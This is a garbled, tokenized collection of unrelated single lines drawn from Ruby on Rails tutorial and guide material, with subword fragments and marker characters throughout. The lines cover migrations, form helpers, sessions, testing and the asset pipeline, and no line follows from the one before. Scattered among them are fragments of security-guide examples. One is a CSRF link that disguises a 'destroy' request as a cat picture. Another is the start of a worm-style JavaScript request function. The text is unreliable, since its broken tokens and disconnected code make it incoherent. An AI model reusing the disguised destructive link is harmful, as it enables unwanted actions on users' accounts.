▁As ▁usual , ▁it ' s ▁a ▁good ▁idea ▁to ▁verify ▁that ▁the ▁test ▁suite ▁is ▁green ▁before ▁proceeding :
▁There ▁are ▁two ▁types ▁of ▁form ▁helpers : ▁those ▁that ▁specifically ▁work ▁with ▁model ▁attributes ▁and ▁those ▁that ▁don ' t ▖
▁#### ▁` split ( value ▁= ▁nil ) `
▁< a ▁ href =' http :// example ▖ com / articles /1/ destroy ' > lo o k ▁at ▁this ▁ cat !
▁The ▁reason ▁is ▁that , ▁as ▁noted ▁in ▁Section ~\ ref { sec : a _ hashed _ password }, ▁\ k ode { has \_ secure \_ password } ▁enforce s ▁validations ▁on ▁the ▁virtual ▁\ k ode { password } ▁and ▁\ k ode { password \_ confirmation } ▁attributes , ▁but ▁the ▁tests ▁in ▁Listing ~\ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive _ test } ▁create ▁an ▁\ k ode {@ user } ▁variable ▁without ▁these ▁attributes :
▁< p > Hello ▁there , ▁this ▁is ▁our ▁image </ p >
▁This ▁can ▁be ▁undo ne ▁using
▁When ▁no ▁CDN ▁is ▁used , ▁a ╼ browser ▁will ▁use ▁this ▁information ▁to ▁cache ▁contents ▖
▁@ order ▁= ▁@ customer ▖ orders ▖ create ( order _ date : ▁Time ▖ now ,
▁And ▁we ' ll ▁see ▁in ▁Section ~\ ref { sec : unsuccessful _ signup s } ▁how ▁validations ▁give ▁us ▁convenient ▁error ▁messages ▁when ▁users ▁make ▁submission s ▁that ▁violat e ▁them .
▁When ▁present ed ▁with ▁a ▁cookie ▁containing ▁a ▁ persistent ▁user ▁id , ▁find ▁the ▁user ▁in ▁the ▁database ▁using ▁the ▁given ▁id , ▁and ▁verify ▁that ▁the ▁remember ▁token ▁cookie ▁matches ▁the ▁ associated ▁hash ▁digest ▁from ▁the ▁database .
▁Be side s ▁`: only _ integer `, ▁this ▁helper ▁also ▁accept s ▁the ▁following ▁options ▁to ▁add ╼ constraints ▁to ▁accept able ▁values :
▁To ▁add ▁a ▁route ▁to ▁the ▁collection :
▁The ▁form ▁itself ▁appears ▁as ▁in ▁Listing ~\ ref { code : signup _ form } .
▁By ▁definition ▁all ▁objects ▁are ▁` duplicable ?` ▁except ▁` nil `, ▁` false `, ▁` true `, ▁symbols , ▁number s , ▁class , ▁module , ▁and ▁method ▁objects .
▁If ▁` return ` ▁is ▁needed ▁it ▁is ▁recommended ▁to ▁explicitly ▁define ▁a ▁method .
▁Create ▁a ▁file ▁called ▁` welcome _ email ▖ html ▖ erb ` ▁in ▁` app / views / user _ mailer / ` ▖
▁Tests ▁for ▁the ▁ validity ▁of ▁a ▁new ▁micropost ▖
▁and ▁understand s ▁strings ▁that ▁start ▁with ▁lower case :
▁# ▁option ▁will ▁only ▁run ▁in ▁the ▁specified ▁context .
▁The ▁Home ▁page ▁with ▁a ▁new ▁micropost ▁form .
▁#### ▁javascript _ url
▁ Migration s ▁change ▁the ▁state ▁of ▁the ▁database ▁using ▁the ▁command
▁as ▁show n ▁in ▁Listing ~\ ref { code : edit _ tests _ logged _ in } .
▁as ▁show n ▁in ▁Listing ~\ ref { code : sample _ app _ readme } .
▁We ' ve ▁used ▁the ▁code ▁in ▁Listing ~\ ref { code : proto _ status _ feed } ▁instead ▁because ▁it ▁general ize s ▁much ▁more ▁natural ly ▁to ▁the ▁full ▁status ▁feed ▁needed ▁in ▁Chapter ~\ ref { cha : following _ users } .
▁U nfortunately , ▁experience ▁shows ▁that ▁even ▁minor ▁point ▁release s ▁can ▁break ▁things , ▁so ▁for ▁the ▁\ emph { Rails ▁Tutorial } ▁we ' ll ▁ er r ▁on ▁the ▁ side ▁of ▁caution ▁by ▁including ▁exact ▁version ▁number s ▁for ▁virtual ly ▁all ▁gems .
▁| ▁` { ▁" person " : ▁[" foo ", ▁ null ] ▁}` ▁| ▁` { ▁: person ▁=> ▁[" foo "] ▁}` ▁|
▁Time ▖ current
▁NOTE ▖ ▁If ▁you ▁want ▁to ▁use ▁multiple ▁Sass ▁files , ▁you ▁should ▁generally ▁use ▁the ▁[ Sass ▁`@ import ` ▁rule ]( http :// sass - lang ▖ com / docs / y a rdoc / file ▖ S A S S _ RE F E RE N C E ▖ html # import )╼ instead ▁of ▁these ▁Sprockets ▁ directive s ▖
▁* ▁ Overriding ▁engine ▁functionality ▁in ▁the ▁application .
▁### ▁What ▁about ▁F e at ure ▁ Request s ?
▁in ▁Listing ~\ ref { code : update _ columns } .
▁belongs _ to ▁: customer , ▁class _ name : ▁" P at r on "
▁The ▁` t ▖ references ` ▁line ▁set s ▁up ▁a ▁foreign ▁key ▁column ▁for ▁the ▁association ▁between ╼ the ▁two ▁models ▖
▁An a log ous ▁construct s ▁exist ▁for ▁other ▁operator s ▁as ▁well :
▁The ▁final ▁step ▁is ▁to ▁define ▁the ▁initial ▁version ▁of ▁the ▁signin ▁page .
▁The ▁` javascript _ include _ tag ` ▁helper ▁returns ▁an ▁HTML ▁` script ` ▁tag ▁for ▁each ▁source ▁provided .
▁We ▁do ▁this ▁by ▁first ▁updating ▁our ▁test ▁with ▁the ▁code ▁in ▁Listing ~\ ref { code : home _ base _ title _ spec }, ▁which ▁update s ▁the ▁previous ▁title ▁test ▁and ▁add s ▁one ▁to ▁test ▁for ▁the ▁absence ▁of ▁the ▁custom ▁\ k ode {" Home "} ▁string ▁in ▁the ▁title .
▁Whi le ▁this ▁is ▁an no y ing , ▁it ' s ▁relative ly ▁easy ▁to ▁fix ▖
▁When ▁using ▁Sprockets ▁ directive s , ▁Sass ▁files ▁exist ▁within ╼ the ir ▁own ▁scope , ▁making ▁variables ▁or ▁ mixin s ▁only ▁available ▁within ▁the ▁document ▁they ▁were ▁defined ▁in .
▁ label _ tag ▁' name '
▁The ▁browser ▁issues ▁a ▁request ▁for ▁the ▁ / users ▁URL .
▁def ▁self ▖ created _ before ( time )
▁You ▁can ▁choose ▁to ▁have ▁specific ╼ validations ▁run ▁when ▁an ▁object ▁is ▁created , ▁saved , ▁or ▁updated .
▁class ▁Application Mailer ▁< ▁ ActionMailer :: Base
▁Let ' s ▁discuss ▁what ▁it ▁take s ▁to ▁make ▁that ▁happen .
▁``` js
▁### ▁ Array ▁Conditions
▁Note ▁that ▁we ' ve ▁added ▁the ▁argument ▁\ k ode { default : ▁false } ▁to ▁\ k ode { add \_ column } ▁in ▁Listing ~\ ref { code : admin _ migration }, ▁which ▁means ▁that ▁users ▁will ▁\ emph { not } ▁be ▁administrator s ▁by ▁default .
▁O p en ▁the ▁` app / models / article ▖ rb ` ▁file ▁and ▁edit ▁it :
▁# ▁config ▖ action _ dispatch ▖ x _ send file _ header ▁= ▁' X - A cc el - R ed ir ec t ' ▁# ▁for ▁ NGINX
▁ Technical ly , ▁SSL ▁is ▁now ▁T L S , ▁for ▁ Transport ▁L a y er ▁ Security , ▁but ▁every one ▁I ▁know ▁ still ▁say s ▁`` SSL '' .
▁You ▁can ▁set ▁up ▁as ▁many ▁dynamic ▁segment s ▁within ▁a ▁regular ▁route ▁as ▁you ▁like ▖
▁200 9 ▖ ordinal ▁# ▁=> ▁" th "
▁In ▁the ▁case ▁of ▁` blank ?` ▁the ▁note ▁read s :
▁The ▁profile ▁of ▁a ▁user ▁to ▁follow , ▁with ▁a ▁follow ▁button .
▁Article ▖ recent ▖ any ?
▁Because ▁it ' s ▁the ▁URL ▁for ▁an ▁address ▁like ▁ http :// www ▖ example ▖ com / ▁( where ▁not h ing ▁comes ▁after ▁the ▁final ▁forward ▁ slash ), ▁the ▁root ▁URL ▁is ▁often ▁refer r ed ▁to ▁as ▁ / ▁( ` ` slash '') ▁for ▁short .
▁The ▁issue ▁is ▁that , ▁without ▁\ k ode { to \_ a }, ▁destroying ▁the ▁user ▁would ▁destroy ▁the ▁posts ▁in ▁the ▁\ k ode { microposts } ▁variable , ▁and ▁as ▁a ▁result
▁These ▁methods ▁will ▁ still ▁be ▁ accessible ▁on ▁the ▁association ▁objects :
▁ rescue _ from ( ActiveRecord :: RecordNotFound ) ▁do ▁| exception |
▁=> ▁#< User : 0 x 22 51 67 c ▁@ email =" mhartl @ example ▖ com ", ▁@ name =" Michael ▁Hartl ">
▁In tr o duction ▁to ▁ MVC
▁ Adding ▁\ k ode { store \_ location } ▁to ▁the ▁logged - in ▁user ▁before ▁filter .
▁[ ` link _ to ` ]( http :// api ▖ rubyonrails ▖ org / classes / ActionView / Helpers / Url Helper ▖ html # method - i - link _ to )╼ is ▁a ▁helper ▁that ▁as s ist s ▁with ▁ generating ▁links ▖
▁To ▁learn ▁more ▁about ▁the ▁different ▁types ▁of ▁associations , ▁read ▁the ▁next ▁section ▁of ▁this ▁guide ▖
▁In line ▁callback ▁blocks ▁using ▁` return ` ▁can ▁be ▁ refactored ▁to ▁evaluate ▁to ▁the ╼ return ed ▁value :
▁ private
▁get ▁Rack :: Util s ▖ escape (' こんにちは ') , ▁controller : ▁' welcome ', ▁action : ▁' index '
▁The ▁` audio _ tag ` ▁helper ▁build s ▁an ▁HTML ▁5 ▁`< audio >` ▁tag ▁to ▁the ▁specified ▁file ▖
▁Because ▁these ▁tests ▁are ▁fai r ly ▁advanced , ▁we ' ll ▁build ▁them ▁up ▁piece ▁by ▁piece .
▁ Overriding ▁the ▁N a m ing ▁ Convention s
▁inside ▁a ▁\ k ode { p } ▁( p ar a gr a ph ) ▁tag .
▁#### ▁image _ submit _ tag
▁# ▁Re mov e ▁this ▁line ▁if ▁you ' re ▁not ▁using ▁ActiveRecord ▁or ▁ActiveRecord ▁fixtures
▁The ▁most ▁common ▁technique s ▁for ▁implement ing ▁sessions ▁in ▁Rails ▁involve ▁using ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / HTTP _ cookie }{\ emph { cookies } }, ▁which ▁are ▁small ▁pieces ▁of ▁text ▁placed ▁on ▁the ▁user ' s ▁browser .
▁ Back ▁in ▁Section ~\ ref { sec : static _ pages } ▁we ▁created ▁a ▁Git ▁branch ▁for ▁the ▁development ▁of ▁static ▁pages .
▁You ▁need ▁to ▁tell ▁the ▁user ▁that ╼ something ▁we nt ▁wrong ▖
▁</ strong >
▁The ▁methods ▁` compact ` ▁and ▁` compact !` ▁return ▁a ▁ Hash ▁without ▁ items ▁with ▁` nil ` ▁value .
▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ feed } .
▁Then ▁we ▁deploy , ▁reset ▁the ▁database , ▁and ▁re seed ▁the ▁sample ▁data :
▁<%= ▁ csrf _ meta _ tags ▁%>
▁# ▁< url - id > d a v id - h einemeier - h an s s on </ url - id >
▁Here ▁is ▁the ▁most ▁straightforward ▁test ▁to ▁check ▁for ▁XSS :
▁The ▁asset ▁pipeline ▁involve s ▁lot s ▁of ▁changes ▁under ▁Rails ' ▁h ood , ▁but ▁from ▁the ▁per spec tive ▁of ▁a ▁typical ▁Rails ▁developer ▁there ▁are ▁three ▁principal ▁features ▁to ▁understand : ▁asset ▁directories , ▁manifest ▁files , ▁and ▁pre process or ▁engines
▁This ▁initializer ▁- ▁which ▁run s ▁only ▁if ▁` cache _ classes ` ▁is ▁set ▁to ▁` false ` ▁- ▁uses ▁` ActionDispatch :: Callbacks ▖ after ` ▁to ▁remove ▁the ▁constant s ▁which ▁have ▁been ▁reference d ▁during ▁the ▁request ▁from ▁the ▁object ▁ space ▁so ▁that ▁they ▁will ▁be ▁ reload ed ▁during ▁the ▁following ▁request .
▁The ▁test ▁appears ▁as ▁in ▁Listing ~\ ref { code : contact _ page _ test }, ▁which ▁simply ▁follows ▁the ▁model ▁last ▁seen ▁in ▁Listing ~\ ref { code : title _ tests } .
▁Oh ▁ dear !
▁@ orders ▁= ▁ Order ▖ where ( customer _ id : ▁@ customer ▖ id )
▁$ ▖ ajax ( url : ▁"/ test ")▖ d one ▁( html ) ▁->
▁As ▁hint ed ▁at ▁in ▁the ▁last ▁section , ▁the ▁feed ▁implementation ▁in ▁Section ~\ ref { sec : a _ first _ feed _ implementation } ▁doesn ' t ▁ scale ▁well ▁when ▁the ▁number ▁of ▁microposts ▁in ▁the ▁feed ▁is ▁large , ▁as ▁would ▁likely ▁happen ▁if ▁a ▁user ▁were ▁following , ▁say , ▁5 000 ▁other ▁users .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / hash / reverse _ merge ▖ rb ` .
▁The ▁first ▁step ▁toward ▁getting ▁custom ▁CSS ▁to ▁work ▁is ▁to ▁create ▁such ▁a ▁custom ▁CSS ▁file :
▁A ▁ preview ▁of ▁HTML ▁version ▁of ▁the ▁account ▁activation ▁email .
▁First , ▁we ▁need ▁to ▁define ▁\ k ode {@ micropost }, ▁which ▁( as ▁before ) ▁we ▁do ▁through ▁the ▁association :
▁because ▁otherwise ▁Rails ▁would ▁look ▁for ▁a ▁\ k ode { R ever se Relationship } ▁class , ▁which ▁doesn ' t ▁exist .
▁When ▁ finished , ▁ press ▁" S end ╼ pull ▁request "▖
▁The ▁new ▁micropost ▁page ▁(\ href { http :// localhost :3000/ microposts / new }{/ microposts / new }) .
▁You ▁can ▁see ▁that ▁the ▁code ▁uses ▁` try ` ▁and ▁avoid s ▁an ▁unnecessary ▁check .
▁In ▁other ▁words , ▁where ▁the ▁\ k ode { relationships } ▁association ▁uses ▁the ▁\ k ode { follower \_ id } ▁foreign ▁key ,
▁<% ▁content _ for ▁: head ▁do ▁%>
▁* ▁` config ▖ action _ dispatch ▖ signed _ cookie _ s alt ` ▁set s ▁the ▁signed ▁cookies ▁ s alt ▁value ▖╼
▁ alternative ly ▁you ▁can ▁set ▁the ▁` RAILS _ RE LA T I V E _ URL _ ROOT ` ▁environment ╼ variable .
▁On ▁many ▁systems , ▁ pending ▁ spec s ▁will ▁be ▁displayed ▁in ▁ y ellow ▁to ▁indicate ▁that ▁they ▁are ▁in ▁between ▁passing ▁( green ) ▁and ▁failing ▁( r ed ) .
▁To ▁arrange ▁this ▁behavior , ▁all ▁we ▁need ▁to ▁do ▁is ▁add ▁a ▁call ▁to ▁\ k ode { log \_ in } ▁in ▁the ▁Users ▁controller ▁\ k ode { create } ▁action , ▁as ▁show n ▁in ▁Listing ~\ ref { code : login _ upon _ signup }
▁( Re call ▁that ▁if ▁Bundler ▁complain s ▁about ▁a ▁\ text tt { read line } ▁error , ▁try ▁adding ▁\ k ode { gem ▁' rb - read line ' } ▁to ▁your ▁\ k ode { Gemfile } ▖)
▁element ▖ style ▖ color ▁= ▁textColor
▁* ▁` action _ view ▖ set _ config s ` ▁Set s ▁up ▁Action ▁View ▁by ▁using ▁the ▁settings ▁in ▁` config ▖ action _ view ` ▁by ▁` send ` ' ing ▁the ▁method ▁names ▁as ▁set ter s ▁to ▁` ActionView :: Base ` ▁and ▁passing ▁the ▁values ▁through .
▁In ▁order ▁to ▁keep ▁the ▁main ▁discussion ▁in dependent ▁of ▁the ▁ exercises , ▁the ▁solution s ▁are ▁not ▁generally ▁incorporate d ▁into ▁subsequent ▁code ▁ listing s .
▁ 123 4 ▖ to _ s (: human _ size ) ▁# ▁=> ▁1▖ 2 1 ▁ K B
▁If ▁it ▁is ▁a ▁hash ▁it ▁ po p s ▁it ▁and ▁returns ▁it , ▁otherwise ▁it ▁returns ▁an ▁empty ▁hash .
▁All ▁of ▁them ▁are ▁user - s up p li ed ▁and ▁may ▁be ▁manipulate d ▁with ▁more ▁or ▁less ▁effort ▖
▁* ▁` ActionDispatch :: Static ` ▁is ▁used ▁to ▁serve ▁static ▁assets ▖
▁Time ▖ current ▁- ▁created _ at
▁For ▁ V im , ▁you ▁type
▁P lease ▁use ╼` < tt > ▖▖▖ </ tt >` ▁for ▁everything ▁else , ▁not ably ▁class ▁or ▁module ▁names ▁with ▁a ╼ namespace ▁as ▁in ▁`< tt > ActiveRecord :: Base </ tt >` .
▁The ▁tests ▁for ▁these ▁button s ▁combine ▁many ▁of ▁the ▁testing ▁technique s ▁covered ▁throughout ▁this ▁tutorial ▁and ▁make ▁for ▁a ▁good ▁exercise ▁in ▁reading ▁code .
▁It ▁won ' t ▁be ▁part ▁of ▁the ▁Rails ▁Git ▁repository .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / array / conversions ▖ rb ` .
▁Using ▁a ▁` Proc ` ▁object ▁gives ▁you ▁the ▁ability ▁to ▁write ▁an ╼ inline ▁ condition ▁instead ▁of ▁a ▁separate ▁method ▖
▁As ▁with ▁the ▁case ▁of ▁user ▁signup ▁( Figure ~\ ref { fig : signup _ failure }), ▁these ▁parameters ▁form ▁a ▁\ emph { nested } ▁hash ▁like ▁the ▁one ▁we ▁saw ▁in ▁Listing ~\ ref { code : nested _ hashes } .
▁in ▁Listing ~\ ref { code : factory _ sequence } .
▁The ▁micropost ▁index ▁page ▁(\ href { http :// localhost :3000/ microposts }{/ microposts }) .
▁within ▁ product ▁we ' ll ▁get ▁`@ product ` ▁in ▁the ▁local ▁variable ▁` product `, ▁as ▁if ▁we ▁ha d ▁written :
▁ attr _ accessor ▁: log _ level
▁ Adding ▁the ▁contents ▁of ▁the ▁\ k ode { flash } ▁variable ▁to ▁the ▁site ▁layout .
▁ Middleware s ▁can ▁also ▁be ▁completely ▁ swap ped ▁out ▁and ▁replace d ▁with ▁other s :
▁This ▁includes ▁\ text tt { rspec - rails } ▁in ▁a ▁development ▁environment ▁so ▁that ▁we ▁have ▁access ▁to ▁RSpec - specific ▁generator s , ▁and ▁it ▁includes ▁it ▁in ▁test ▁mode ▁in ▁order ▁to ▁run ▁the ▁tests .
▁| ▁app / controllers / comments _ controller ▖ rb ▁| ▁The ▁ Comments ▁controller ▁|
▁block , ▁time ▁= ▁self , ▁Time ▖ current
▁If ▁you ▁are ▁using ▁Windows ,╼ your ▁pro mp t ▁will ▁look ▁something ▁like ▁` c : \ source _ code >`
▁<%= ▁javascript _ include _ tag ▁" application ", ▁debug : ▁true ▁%>
▁If ▁you ▁were ▁to ▁create ▁a ▁comment ╼ right ▁now , ▁you ▁would ▁see ▁this ▁error :
▁* ▁strings ▁ com po s ed ▁only ▁of ▁whitespace ▁( see ▁note ▁below ),
▁User ▖ all
▁c 1 ▖ save
▁Extensions ▁to ▁` Date `
▁I ▁particular ly ▁recommend ▁ installing ▁\ href { http :// n ode js ▖ org /}{ N ode ▖ js } .
▁Testing ▁that ▁new ly ▁signed - up ▁users ▁are ▁also ▁signed ▁in .
▁create ▁app
▁This ▁code ▁simply ▁reuse s ▁the ▁token ▁and ▁digest ▁methods ▁used ▁for ▁the ▁remember ▁token , ▁as ▁we ▁can ▁see ▁by ▁compar ing ▁with ▁the ▁\ k ode { remember } ▁method ▁from ▁Listing ~\ ref { code : user _ model _ remember } :
▁#### ▁Setting ▁Configuration ▁ Settings ▁in ▁the ▁Application
▁ Cl ic k ▁on ▁" Edit ", ▁if ▁you ▁need ▁to ▁change ▁the ▁branch es ▁being ▁compar ed ▁( it ▁compare s ╼ " master " ▁by ▁default ) ▁and ▁ press ▁" Cl ic k ▁to ▁create ▁a ▁pull ▁request ▁for ▁this ╼ com p ar is on " .
▁We ▁see ▁that ▁\ k ode { xhr } ▁take s ▁as ▁arguments ▁a ▁symbol ▁for ▁the ▁relevant ▁HTTP ▁method , ▁a ▁symbol ▁for ▁the ▁action , ▁and ▁a ▁hash ▁represent ing ▁the ▁contents ▁of ▁\ k ode { params } ▁in ▁the ▁controller ▁itself .
▁Now ▁we ' re ▁prepar ed ▁to ▁see ▁why
▁For ▁reference , ▁the ▁final ▁\ k ode { Gemfile } ▁is ▁show n ▁in ▁Listing ~\ ref { code : final _ gemfile } .
▁Defin ing ▁a ▁\ k ode { Proc file } ▁for ▁ Puma .
▁On ce ▁you ' ve ▁installed ▁ RubyGems , ▁ installing ▁Rails ▁should ▁be ▁easy .
▁Recall ing ▁from ▁Section ~\ ref { sec : css _ revisited } ▁we ▁can ▁omit ▁the ▁ curl y ▁braces ▁for ▁final ▁hash ▁arguments , ▁we ▁can ▁create ▁another ▁user ▁by ▁passing ▁a ▁hash ▁to ▁the ▁\ k ode { initialize } ▁method ▁to ▁create ▁a ▁user ▁with ▁pre - defined ▁attributes :
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : login _ after _ signup _ test }
▁You ▁can ▁use ▁` limit ` ▁to ▁specify ▁the ▁number ▁of ▁records ▁to ▁be ▁retrieved , ▁and ▁use ▁` offset ` ▁to ▁specify ▁the ▁number ▁of ▁records ▁to ▁skip ▁before ▁starting ▁to ▁return ▁the ▁records ▖
▁in ▁Listing ~\ ref { code : authentication _ step s } .
▁The ▁second ▁element ▁inside ▁the ▁ div s ▁is ▁a ▁list ▁of ▁navigation ▁links , ▁made ▁using ▁the ▁\ emph { un order ed ▁list } ▁tag ▁\ k ode { ul }, ▁together ▁with ▁the ▁\ emph { list ▁item } ▁tag ▁\ k ode { li } :
▁The ▁method ▁` with _ options ` ▁provides ▁a ▁way ▁to ▁ factor ▁out ▁common ▁options ▁in ▁a ▁series ▁of ▁method ▁calls .
▁t ▖ timestamp s
▁( Because ▁of ▁the ▁email ▁downcas ing ▁callback ▁in ▁Listing ~\ ref { code : email _ downcase }, ▁this ▁will ▁ never ▁make ▁a ▁difference ▁in ▁this ▁tutorial , ▁but ▁it ' s ▁a ▁good ▁practice ▁in ▁case ▁the ▁\ k ode { gravatar \_ for } ▁ever ▁get s ▁used ▁on ▁email ▁addresses ▁from ▁other ▁source s ▖)
▁A ▁` has _ one ▁: through ` ▁association ▁set s ▁up ▁a ▁one - to - one ▁connection ▁with ▁another ▁model ▖
▁| ▁app / helpers / comments _ helper ▖ rb ▁| ▁A ▁view ▁helper ▁file ▁|
▁entry ▖ author ▁do ▁| author |
▁Run s ▁for ▁every ▁request ▁in ▁` development ` ▁mode , ▁but ▁only ▁once ▁for ▁` production ` ▁or ▁ environments ▁with ▁` cache _ classes ` ▁set ▁to ▁` true ` .
▁$ ▁bundle ▁exec ▁rake ▁db : migrate : reset ╼ $ ▁bundle ▁exec ▁rake ▁db : seed
▁$ ▁bundle ▁exec ▁rake ▁db : migrate
▁Whi te list ▁filter ing ▁state s ▁the ▁values ▁allow ed ▁as ▁oppos ed ▁to ▁the ▁values ▁not ▁allow ed ▖
▁get ▁' preview ', ▁on : ▁: new
▁in ▁Listing ~\ ref { code : name _ presence _ test } .
▁\ href { http :// r ailscasts ▖ com /}{ RailsCasts } : ▁It ' s ▁hard ▁to ▁over emph a size ▁what ▁a ▁great ▁resource ▁ RailsCasts ▁is .
▁If ▁you ▁check ▁the ▁[ E ve ry one ' s ▁ Issue s ]( https :// github ▖ com / rails / rails / issue s ) ▁list ▁in ▁GitHub ▁ Issue s , ▁you ' ll ▁find ▁lot s ▁of ▁issues ▁already ▁ requiring ▁a tt en tion ▖
▁$ ▁bin / rake ▁db : sessions : clear
▁Because ▁using ▁two ▁spaces ▁for ▁indentation ▁is ▁a ▁ ne ar - universal ▁convention ▁in ▁Ruby , ▁I ▁also ▁recommend ▁changing ▁the ▁editor ▁to ▁use ▁two ▁spaces ▁instead ▁of ▁the ▁default ▁four .
▁ Adding ▁\ k ode { has \_ secure \_ password } ▁to ▁the ▁User ▁model ▖
▁There ' s ▁also ▁\ k ode { all } :
▁ delegate ▁: name , ▁to : ▁: profile
▁( Note ▁that ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / M emoization }{\ emph { me m o ize } } ▁is ▁a ▁technical ▁ term ; ▁in ▁particular , ▁it ' s ▁\ emph { not } ▁a ▁ mis s pe ll ing ▁of ▁`` me m or ize '' ▖)
▁in ▁Listing ~\ ref { code : show _ only _ と c tive _ users _ exercise } .
▁( This ▁is ▁known ▁as ▁a ▁`` shallow ▁copy '' .
▁As ▁implie d ▁by ▁their ▁generic ▁names , ▁the ▁applications ▁ developed ▁in ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁are ▁not ▁specific ▁to ▁any ▁particular ▁kind ▁of ▁website .
▁I ' m ▁sure ▁they ' ll ▁app re ci ate ▁it ▁in ╼ the ▁same ▁way ▁that ▁you ▁app re ci ate ▁feedback ▁on ▁your ▁ patch es .
▁These ▁requests ▁are ▁less ▁common ▁than ▁\ text tt { GET } ▁and ▁\ text tt { POST } ▁since ▁browsers ▁are ▁in c a p able ▁of ▁sending ▁them ▁native ly , ▁but ▁some ▁web ▁framework s ▁( including ▁Ruby ▁on ▁Rails ) ▁have ▁c l ever ▁ways ▁of ▁making ▁it ▁\ emph { see m } ▁like ▁browsers ▁are ▁is s u ing ▁such ▁requests .
▁This ▁is ▁most ▁useful ▁when ▁updating ▁sever al ▁attributes ▁at ▁once ▖
▁Ou r ▁User ▁model ▁accept s ▁data ▁such ▁as ▁blank ▁names ▁and ▁invalid ▁email ▁addresses ▁without ▁complain t .
▁If ▁you ▁use ▁ TextMate , ▁you ▁can ▁find ▁this ▁feature ▁under ▁\ text tt { View ▁> ▁ W rap ▁C ol um n ▁> ▁ 78 } .
▁uses ▁the ▁\ k ode { page } ▁variable ▁( also ▁provided ▁by ▁Capybara ) ▁to ▁express ▁the ▁expect ation ▁that ▁the ▁result ing ▁page ▁should ▁have ▁the ▁right ▁content .
▁We ▁can ▁use ▁the ▁above ▁method ▁to ▁construct ▁the ▁necessary ▁array ▁of ▁followed ▁user ▁id s ▁by ▁calling ~\ k ode { id } ▁on ▁each ▁element ▁in ▁\ k ode { user ▖ followed \_ users } .
▁ n >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁ motivation _ and _ s trategy ▁( end )╼╼ ▁\ subsection { A ▁first ▁feed ▁implementation } ▁% ▁( fold )╼ ▁\ label { sec : a _ first _ feed _ implementation }╼╼ With ▁the ▁status ▁feed ▁design ▁requirements ▁capture d ▁in ▁the ▁test ▁from ▁Listing ▁\ ref { code : full _ feed _ test }, ▁we ' re ▁ready ▁to ▁start ▁writing ▁the ▁feed ▖
▁$ ▁rails ▁new ▁ unicorn
▁Additional ly ▁you ▁can ▁specify ▁the ▁` size : ▁"#{ width } x # { height } " ` ▁option ▁just ▁like ▁an ▁` image _ tag ` ▖
▁" special " ▁: ▁" products "
▁Some ▁Rails ▁classes ▁are ▁used ▁like ▁ordinar y ▁Ruby ▁objects , ▁but ▁some ▁are ▁just ▁\ href { http :// www ▖ answer s ▖ com / gr ist } { gr ist } ▁for ▁Rails ' ▁magic ▁mil l .
▁In ▁your ▁migrations / schema , ▁you ▁will ▁add ▁a ▁ references ▁column ▁to ▁the ▁model ▁itself .
▁=> ▁StaticPages Controller
▁secret _ key _ base :
▁var ▁ ID List ▁= ▁ '' ; ▁var ▁C R um b ▁= ▁ '' ; ▁function ▁make Request ( url , ▁F un c , ▁Method , P ar a m ) ▁ { ▁ ▖ ▖ .
▁* ▁` config ▖ action _ dispatch ▖ session _ store ` ▁set s ▁the ▁name ▁of ▁the ▁store ▁for ▁session ▁data ▖
▁A ▁validation ▁for ▁the ▁micropost ' s ▁\ k ode { user \_ id } ▖
▁We ' ll ▁arrange ▁for ▁this ▁to ▁happen ▁using ▁a ▁\ emph { default ▁scope } .
▁To ▁apply ▁some one ' s ▁changes ▁you ▁need ▁first ▁to ▁create ▁a ▁d ed icated ▁branch :
▁You ▁can ▁supply ▁a ▁path ▁to ▁the ▁image ▁if ▁you ▁like :
▁( 1 ▖ ▖ 5 )▖ sum ▁ { | n | ▁ n ▁* ▁2 ▁ } ▁# ▁=> ▁30
▁ Module ▖ new ▖ name ▁# ▁=> ▁nil
▁So ▁far ▁we ' ve ▁ s p ent ▁a ▁lot ▁of ▁time ▁understanding ▁strings , ▁and ▁there ' s ▁a ▁natural ▁way ▁to ▁get ▁from ▁strings ▁to ▁arrays ▁using ▁the ▁\ k ode { split } ▁method :
▁The ▁profile ▁of ▁a ▁different ▁user , ▁also ▁with ▁microposts ▁(\ href { http ://0▖0▖0▖0:3000/ users /5}{/ users /5}) .
▁as ▁show n ▁in ▁Listing ~\ ref { code : sign _ in _ with _ remember } .
▁=> ▁B oo ting ▁ WEBrick
▁A lt er na tive ly , ▁you ▁can ▁also ▁do ▁it ▁through ▁the ▁` config ` ▁method ▁on ▁the ▁` Rails ▖ application ` ▁object :
▁To ▁show ▁the ▁comments ▁on ▁an ▁article , ▁edit ▁` app / views / blorgh / articles / show ▖ html ▖ erb ` ▁and ╼ add ▁this ▁line ▁before ▁the ▁" Edit " ▁link :
▁has _ many ▁: confirmed _ orders , ▁-> ▁ { ▁where ▁" confirmed ▁= ▁1 " ▁ },
▁In ▁Chapter ~\ ref { cha : log _ in _ log _ out }, ▁we ▁will ▁complete ▁our ▁authentication ▁machinery ▁by ▁allow ing ▁users ▁to ▁log ▁in ▁and ▁out ▁of ▁the ▁application .
▁On ce ▁you ▁reach ▁a ▁stop p ing ▁point ▁like ▁this , ▁it ' s ▁usually ▁a ▁good ▁idea ▁to ▁push ▁your ▁code ▁up ▁to ▁a ▁remote ▁repository ▁( which , ▁if ▁you ▁followed ▁the ▁steps ▁in ▁Section ~\ ref { sec : bitbucket }, ▁will ▁be ▁Bitbucket ) :
▁* = ▁require _ self
▁In ▁the ▁Unix ▁ tr ad it ion , ▁the ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Make _ ( s of t w a re ) }{\ emph { make } } ▁ utility ▁has ▁ play ed ▁an ▁important ▁role ▁in ▁build ing ▁execut able ▁program s ▁from ▁source ▁code ; ▁many ▁a ▁computer ▁ha c k er ▁has ▁commit ted ▁to ▁m us c le ▁memory ▁the ▁line
▁Note ▁that , ▁in ▁order ▁to ▁ensure ▁that ▁the ▁command ▁uses ▁the ▁version ▁of ▁Rake ▁corresponding ▁to ▁our ▁\ k ode { Gemfile }, ▁we ▁need ▁to ▁run ▁\ k ode { rake } ▁using ▁\ k ode { bundle ▁exec } .
